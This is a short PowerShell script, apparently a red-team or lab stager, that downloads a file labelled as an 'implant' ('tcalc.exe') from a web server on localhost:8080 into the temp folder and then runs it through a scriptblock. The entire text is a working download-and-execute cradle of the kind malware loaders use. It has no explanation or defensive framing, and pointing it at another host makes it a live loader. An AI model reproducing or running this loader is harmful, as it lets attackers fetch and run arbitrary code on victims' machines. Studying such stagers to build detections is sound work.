$implant = 'tcalc.exe'
$url = 'http://localhost:8080', $implant -join '/'
$file = $env:tmp, $implant -join '\'
(New-Object System.Net.WebClient).DownloadFile($url, $file);
[scriptblock]::Create($file).Invoke();